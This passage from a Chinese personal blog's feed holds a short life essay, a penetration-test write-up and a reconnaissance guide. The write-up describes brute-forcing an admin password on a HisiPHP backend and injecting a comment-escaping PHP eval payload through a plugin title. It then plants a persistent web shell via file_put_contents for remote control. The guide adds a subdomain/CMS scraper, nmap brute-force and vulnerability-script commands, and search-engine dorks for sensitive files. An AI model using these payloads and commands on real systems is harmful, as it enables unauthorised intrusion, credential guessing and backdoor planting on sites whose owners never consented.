<p>琢磨先生说过：“<strong>过日子，又不是审稿子，不涉及原则性的问题，你何苦要别人每个字都对？每句话都符合逻辑？每个段落都要照顾你的情绪？你只需要有时当作通假字，有时当作倒装句，有时当作比喻暗示，即可。在成人世界里，精确，是一件残忍的处世方式。糊涂，谁说不是一种高智商的生活态度。</strong>”，这句话我深有体会，下面我想说的是我个人的观点，我不知对与错，但在我的世界观里是觉得不妥的。记得在之前上课的时候，课堂氛围是死气沉沉的，但是我不喜欢这样，所以我经常会活泼并且滑稽的回答问题，这段时间很显然的提高的课堂效率，睡觉的同学少了，和我一起回答问题的人多了，但是当时老师是非常严厉的批评我的，他说我是在扰乱课堂，给我念’xxx守则’说我这是不对的，，，然后我就再也没有积极回答过问题，上课氛围依旧变得死气沉沉的，然而我并不觉得这个“对”是好的；我更认为的是解决问题大于纠结对错。</p>
<p><strong>成熟的定义是能互相理解对方</strong></p>
<p>在爱情上，<strong>在谁身上开始，也需要在谁身上结束</strong>。不要谈着现任，心里还想着前任，否则你的爱情线不会幸福的。</p>
<p>要想爱情幸福还有一个很重要，爱要相互理解，关系、尊重和了解对方</p>
<p><strong>其实不读书也没什么坏处，只是太过沉溺于现实世界，容易让人狗苟蝇营。比如，你可以通过读一本传记，窥见别人的人生。你可以读一本心理学的书，洞悉自我的处境。你可以读一本历史的书，看刀光剑影，明白再辉煌的生命也会尘埃落定。读书，让你在历史、未来、现实、空虚中来回穿梭，然后发现自己生活的更多可能。</strong></p>
<blockquote>
<p>待续</p>
</blockquote>
<p>这是个技术博客，也是个写作博客，因为我希望我的人生除了在事业上有所成就，还要知书达理。</p>
]]></content>
      <categories>
        <category>书品人生</category>
      </categories>
      <tags>
        <tag>生活鸡汤</tag>
      </tags>
  </entry>
  <entry>
    <title>一次渗透测试拿下shell过程</title>
    <url>/2019/12/18/%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8B%BF%E4%B8%8Bshell%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="漏洞过程"><a href="#漏洞过程" class="headerlink" title="漏洞过程"></a>漏洞过程</h2><ol>
<li>爆破账号密码，获取了管理员权限</li>
<li>这个是<code>HisiPHP</code>的后台，找到了相关漏洞复现</li>
<li>上传<code>shell</code>，用菜刀连接</li>
<li><code>linux</code>… 无后续</li>
</ol>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="爆破弱口令"><a href="#爆破弱口令" class="headerlink" title="爆破弱口令"></a>爆破弱口令</h3><p>登陆的时候有温馨提醒，如下这样</p>
<p><img src="http://static.zybuluo.com/1kbfree/bm459u8x1p44wgfobmt0rs5f/image.png" alt="image.png-227kB"></p>
<p>这就说明账号正确，但是密码不正确，那就跑<code>admin</code>账户的，然后经过测试发现密码是<code>123456dcba</code></p>
<h3 id="进后台getshell"><a href="#进后台getshell" class="headerlink" title="进后台getshell"></a>进后台<code>getshell</code></h3><p>1、打开系统 -&gt; 插件</p>
<p><img src="http://static.zybuluo.com/1kbfree/a5c7uputnzclauuo1duymcea/image.png" alt="image.png-109.6kB"></p>
<p>2、然后在插件标题处填写如下内容</p>
<p><img src="http://static.zybuluo.com/1kbfree/y278uu6ps9ngdwpfegeymsl2/image.png" alt="image.png-176.6kB"></p>
<p><code>aaa1*/@eval($_REQUEST[a]);/*</code></p>
<p>这里的原理是因为我们写的<strong>插件标题</strong>会在一个<code>php</code>文件里的注释里如我的插件标题为<code>aaa1*/@eval($_REQUEST[a]);/*</code>，就会在<code>php</code>文件里变成这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"> * aaa*/</span>@<span class="keyword">eval</span>($_REQUEST[a]);<span class="comment">/*插件</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"> * <span class="doctag">@package</span> plugins\awd</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"> */</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">...</span></pre></td></tr></table></figure>

<p>因为用<code>*/</code>把第一段注释给闭合了，然后用<code>/*</code>把后面的注释闭合了，导致绕过可以执行<code>php</code>代码</p>
<p>然后程序会自动返回插件地址在哪，然后直接打开带参数就可以执行<code>php</code>代码了</p>
<p>3、因为这里的执行代码在后台，是需要登录的，比较麻烦，然后我就在其他目录写了一个<code>shell</code></p>
<p>首先获取绝对路径（把页面弄报错，<code>thinkphp</code>开启了<code>debug</code>的话都可以看目录）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;www&#x2F;wwwroot&#x2F;xxx.xxx.com&#x2F;</span></pre></td></tr></table></figure>

<p>然后访问如下写入一个<code>shell</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;admin.php&#x2F;plugins&#x2F;awd&#x2F;awd.php?a&#x3D;file_put_contents(&#39;&#x2F;www&#x2F;wwwroot&#x2F;xxx.xxx.com&#x2F;public&#x2F;upload&#x2F;test.php&#39;,&#39;&lt;?php @eval($_REQUEST[abc]);&#39;);</span></pre></td></tr></table></figure>

<p>然后利用菜刀连接<code>http://xxx.xxx.xxx/upload/test.php</code>密码<code>abc</code>即可</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集之我见</title>
    <url>/2019/12/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%88%91%E8%A7%81/</url>
    <content><![CDATA[<h1 id="信息收集之我见"><a href="#信息收集之我见" class="headerlink" title="信息收集之我见"></a>信息收集之我见</h1><p>标签（空格分隔）： web安全</p>
<hr>
<blockquote>
<p>来源网络，回馈网络</p>
</blockquote>
<p>对一个网站挖掘的深浅来说就得看你收集的如何，这说明信息收集在漏洞挖掘中是非常的重要的。</p>
<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>子域名收集是最简单的收集手法之一，有很多在线的工具可以直接套用，这里分享几个我经常用的。</p>
<h4 id="开心的时候用用这个扫描器"><a href="#开心的时候用用这个扫描器" class="headerlink" title="开心的时候用用这个扫描器"></a>开心的时候用用这个扫描器</h4><p>为什么这么说，因为这是我写的（你生气用的话我怕我屏幕里突然冒出一个拖孩）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">url = input( <span class="string">'url(如baidu.com): '</span> )</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">head=&#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'</span>&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ip = <span class="string">'http://site.ip138.com/&#123;&#125;'</span>.format( url )</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># domain_url = url.split('.')</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment"># domain_url = domain_url[1]+'.'+domain_url[2]</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">domain_url = url</span></pre></td></tr><tr><td class="code"><pre><span class="line">domain = <span class="string">'http://site.ip138.com/&#123;&#125;/domain.htm'</span>.format( domain_url )</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">t = time.strftime(<span class="string">"%Y-%m-%d"</span>+<span class="string">'_'</span>, time.localtime())</span></pre></td></tr><tr><td class="code"><pre><span class="line">html_file = open( url+<span class="string">'_'</span>+t+<span class="string">'.html'</span>,<span class="string">'w'</span> )</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">html_file.write( <span class="string">'''</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;head&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;title&gt;%s的扫描结果&lt;/title&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"&gt;&lt;/script&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;style&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">pre&#123;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">margin: 0 0 0px;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&#125;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;/style&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;/head&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string"></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;ul id="myTab" class="nav nav-tabs navbar-fixed-top navbar navbar-default"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    &lt;li class="active"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;a href="#ip" data-toggle="tab"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">             IP历史解析</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;/a&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    &lt;/li&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    &lt;li&gt;&lt;a href="#cms" data-toggle="tab"&gt;CMS识别&lt;/a&gt;&lt;/li&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">    &lt;li&gt;&lt;a href="#domain" data-toggle="tab"&gt;子域名信息&lt;/a&gt;&lt;/li&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;/ul&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;br&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;br&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;br&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;br&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">&lt;div id="myTabContent" class="tab-content"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">'''</span>%url )</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IP</span><span class="params">( threading.Thread )</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, ip)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        threading.Thread.__init__(self)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.ip = ip</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        r = requests.get( self.ip,headers = head )</span></pre></td></tr><tr><td class="code"><pre><span class="line">        html = r.text</span></pre></td></tr><tr><td class="code"><pre><span class="line">        bs = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        html_file.write(<span class="string">'&lt;div class="tab-pane fade in active" id="ip"&gt;'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> bs.find_all(<span class="string">'p'</span>):</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ipc = i.get_text()</span></pre></td></tr><tr><td class="code"><pre><span class="line">            ip_html = <span class="string">'&lt;pre&gt;&#123;&#125;&lt;/pre&gt;'</span>.format( ipc )</span></pre></td></tr><tr><td class="code"><pre><span class="line">            html_file.write( ip_html )</span></pre></td></tr><tr><td class="code"><pre><span class="line">        html_file.write(<span class="string">'&lt;/div&gt;'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CMS</span><span class="params">( threading.Thread )</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, cms)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        threading.Thread.__init__(self)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.cms = cms</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        cms = requests.post(<span class="string">'http://whatweb.bugscaner.com/what/'</span>, data=&#123;<span class="string">'url'</span>: self.cms&#125;, headers = head)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        text = cms.text</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Web_Frameworks = re.search(<span class="string">'"Web Frameworks": "(.*?)"]'</span>, text)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Programming_Languages = re.search(<span class="string">'"Programming Languages":(.*?)"]'</span>, text)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        JavaScript_Frameworks = re.search(<span class="string">'"JavaScript Frameworks": (.*?)"]'</span>, text)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        CMS = re.search(<span class="string">'"CMS": (.*?)"]'</span>, text)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Web_Server = re.search(<span class="string">'"Web Servers": (.*?)"]'</span>, text)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> CMS:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            CMS = CMS.group(<span class="number">1</span>)+<span class="string">'"]'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> Programming_Languages:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Programming_Languages = Programming_Languages.group(<span class="number">1</span>)+<span class="string">'"]'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> JavaScript_Frameworks:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            JavaScript_Frameworks = JavaScript_Frameworks.group(<span class="number">1</span>)+<span class="string">'"]'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> Web_Frameworks:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Web_Frameworks = Web_Frameworks.group(<span class="number">1</span>)+<span class="string">'"]'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">if</span> Web_Server:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            Web_Server = Web_Server.group(<span class="number">1</span>)+<span class="string">'"]'</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        html = <span class="string">'''</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;div class="tab-pane fade" id="cms"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;div class="table-responsive"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;table class="table table-condensed"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">           &lt;tr&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;th&gt;web框架&lt;/th&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;th&gt;脚本版本&lt;/th&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;th&gt;JavaScript框架&lt;/th&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;th&gt;CMS框架&lt;/th&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;th&gt;web服务器&lt;/th&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">          &lt;/tr&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">          &lt;tr&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;td&gt;&#123;0&#125;&lt;/td&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;td&gt;&#123;1&#125;&lt;/td&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;td&gt;&#123;2&#125;&lt;/td&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;td&gt;&#123;3&#125;&lt;/td&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">            &lt;td&gt;&#123;4&#125;&lt;/td&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">          &lt;/tr&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;/table&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;/div&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        &lt;/div&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="string">        '''</span>.format(Web_Frameworks,Programming_Languages,JavaScript_Frameworks,CMS,Web_Server)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        html_file.write( html )</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMAIN</span><span class="params">( threading.Thread )</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        threading.Thread.__init__(self)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        self.domain = domain</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        r = requests.get( self.domain,headers = head )</span></pre></td></tr><tr><td class="code"><pre><span class="line">        html = r.text</span></pre></td></tr><tr><td class="code"><pre><span class="line">        bs = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        html_file.write(<span class="string">'&lt;div class="tab-pane fade in active" id="domain"'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">        num = <span class="number">0</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> bs.find_all(<span class="string">'p'</span>):</span></pre></td></tr><tr><td class="code"><pre><span class="line">            num += <span class="number">1</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            html_file.write( <span class="string">'&lt;br&gt;'</span> )</span></pre></td></tr><tr><td class="code"><pre><span class="line">            domainc = i.get_text()</span></pre></td></tr><tr><td class="code"><pre><span class="line">            domain_html = <span class="string">'&lt;pre&gt;[&#123;&#125;]： &#123;&#125;&lt;/pre&gt;'</span>.format( num,domainc )</span></pre></td></tr><tr><td class="code"><pre><span class="line">            html_file.write( domain_html )</span></pre></td></tr><tr><td class="code"><pre><span class="line">            print( domain_html )</span></pre></td></tr><tr><td class="code"><pre><span class="line">        html_file.write(<span class="string">'&lt;/div&gt;'</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">ip_cls = IP(ip)</span></pre></td></tr><tr><td class="code"><pre><span class="line">ip_html = ip_cls.run()</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">cms_cls = CMS(url)</span></pre></td></tr><tr><td class="code"><pre><span class="line">cms_html = cms_cls.run()</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">domain_cls = DOMAIN( domain )</span></pre></td></tr><tr><td class="code"><pre><span class="line">domain_html = domain_cls.run()</span></pre></td></tr></table></figure>

<h4 id="github开源的子域名扫描器"><a href="#github开源的子域名扫描器" class="headerlink" title="github开源的子域名扫描器"></a>github开源的子域名扫描器</h4><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a><br><a href="https://github.com/chuhades/dnsbrute" target="_blank" rel="noopener">https://github.com/chuhades/dnsbrute</a></p>
<h4 id="在线网站收集"><a href="#在线网站收集" class="headerlink" title="在线网站收集"></a>在线网站收集</h4><h5 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h5><p><a href="https://d.chinacycc.com/（非常推荐）" target="_blank" rel="noopener">https://d.chinacycc.com/（非常推荐）</a></p>
<p><img src="http://static.zybuluo.com/1kbfree/qs0mh7b7r6hsaza75elhutsg/image_1dbuqgbbl2bh1v10nm68jh1j509.png" alt="image_1dbuqgbbl2bh1v10nm68jh1j509.png-112kB"></p>
<p>然后不到30秒就出结果了</p>
<p><img src="http://static.zybuluo.com/1kbfree/1iyab59sog11djizbbiw9h0c/image_1dbuqjj0a10o118r155p1q491k1lm.png" alt="image_1dbuqjj0a10o118r155p1q491k1lm.png-34.3kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/qltdwf3s73s6i06193dxfq85/image_1dbuqkf3l1qdehf418221uslika13.png" alt="image_1dbuqkf3l1qdehf418221uslika13.png-175.7kB"></p>
<h5 id="2、"><a href="#2、" class="headerlink" title="2、"></a>2、</h5><p><a href="http://z.zcjun.com/" target="_blank" rel="noopener">http://z.zcjun.com/</a><br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p>
<h3 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h3><h4 id="扫描端口并且标记可以爆破的服务"><a href="#扫描端口并且标记可以爆破的服务" class="headerlink" title="扫描端口并且标记可以爆破的服务"></a>扫描端口并且标记可以爆破的服务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 目标 --script&#x3D;ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute</span></pre></td></tr></table></figure>

<h4 id="判断常见的漏洞并扫描端口"><a href="#判断常见的漏洞并扫描端口" class="headerlink" title="判断常见的漏洞并扫描端口"></a>判断常见的漏洞并扫描端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 目标 --script&#x3D;auth,vuln</span></pre></td></tr></table></figure>

<h4 id="精确判断漏洞并扫描端口"><a href="#精确判断漏洞并扫描端口" class="headerlink" title="精确判断漏洞并扫描端口"></a>精确判断漏洞并扫描端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 目标 --script&#x3D;dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</span></pre></td></tr></table></figure>

<h4 id="我喜欢这样做"><a href="#我喜欢这样做" class="headerlink" title="我喜欢这样做"></a>我喜欢这样做</h4><p>1、扫描子域名</p>
<p><img src="http://static.zybuluo.com/1kbfree/gwt2yb1mh4yk7tn2baumapxv/image_1dbutat2nhgqgid17iv68f2g42d.png" alt="image_1dbutat2nhgqgid17iv68f2g42d.png-64.3kB"></p>
<p>提取出域名/<code>ip</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/z79vppxuhs029n7lzpdhl1v9/image_1dbutad6a1965dff1d06kuoi2m20.png" alt="image_1dbutad6a1965dff1d06kuoi2m20.png-172kB"></p>
<p>然后把域名放到<code>975.txt</code></p>
<p>2、批量扫描端口和漏洞检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -iL 975.txt --script&#x3D;auth,vuln,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute &gt; scan.txt</span></pre></td></tr></table></figure>

<p>然后根据对应开放的端口进行针对性漏洞挖掘</p>
<h3 id="c段信息收集"><a href="#c段信息收集" class="headerlink" title="c段信息收集"></a>c段信息收集</h3><p>c段的话我一般都是使用<code>iis put</code>这款工具来扫描，可以自定义扫描<code>1-255</code>的端口并且还有返回服务器<code>banner</code>信息</p>
<p>自定义的端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">135,139,80,8080,15672,873,8983,7001,4848,6379,2381,8161,11211,5335,5336,7809,2181,9200,50070,50075,5984,2375,7809,16992,16993</span></pre></td></tr></table></figure>

<p><img src="http://static.zybuluo.com/1kbfree/wkbp83yz8x0fkewwcyh7vx9b/image_1dbuu62uk1f3q1gfqbtk1r5l11qi3p.png" alt="image_1dbuu62uk1f3q1gfqbtk1r5l11qi3p.png-114.4kB"></p>
<p>这里只是演示下他跑起来的美</p>
<h3 id="目录信息收集"><a href="#目录信息收集" class="headerlink" title="目录信息收集"></a>目录信息收集</h3><p>目录收集工具有很多，但是最看重的还是目录字典，之前我拿了很多工具的字典去重集合起来超级超级大，只不过是在之前电脑那里还原的时候忘记了备份、、、（说这句话主要是想让你们也可以这样子做，方便自己，然后发我一份，方便你我）</p>
<p>这里推荐一个工具<code>7kbstorm</code></p>
<p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p>
<blockquote>
<p>像<code>403</code>、<code>404</code>这种页面千万不要关闭，放目录里面扫就ok</p>
</blockquote>
<h3 id="谷歌语法收集铭感文件"><a href="#谷歌语法收集铭感文件" class="headerlink" title="谷歌语法收集铭感文件"></a>谷歌语法收集铭感文件</h3><p>最常见的就是用搜索引擎~</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:ooxx.com filetype:xls</span></pre></td></tr></table></figure>

<p>首先试试百度</p>
<p><img src="http://static.zybuluo.com/1kbfree/ztnx3vmhmv1n8amubgs2k6m5/image_1dbv9cp101p0h1i1cid6g35190n46.png" alt="image_1dbv9cp101p0h1i1cid6g35190n46.png-48.2kB"></p>
<blockquote>
<p>$!@!~~WDwadawicnm</p>
</blockquote>
<p>试试必应</p>
<p><img src="http://static.zybuluo.com/1kbfree/z4qkha9n1un7ukk67g1uqii5/image_1dbv9k8liv5n18n814fu18j25k53.png" alt="image_1dbv9k8liv5n18n814fu18j25k53.png-120kB"></p>
<p>这里主要是收集网站敏感文件（比如目标的某个系统手册演示的截图中截图到了用户名，然后我们可以根据用户名来爆破密码；甚至可以看看有没有写系统默认密码，或者一些后台的目录路径，如果有目录就可以尝试对其访问，说不定有未授权~）</p>
<p>还能尝试对后台进行查找</p>
